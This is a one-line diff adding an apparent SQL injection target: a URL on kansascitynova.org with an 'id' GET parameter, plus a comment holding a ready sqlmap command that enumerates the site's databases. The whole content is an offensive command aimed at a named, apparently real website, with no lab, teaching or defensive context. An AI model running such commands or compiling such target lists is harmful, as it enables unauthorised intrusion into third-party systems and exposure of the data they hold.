@@ -1,0 +1,1 @@
+http://kansascitynova.org/news.php?id=42 (GET)  # sqlmap.py -u http://kansascitynova.org/news.php?id=42 --dbs
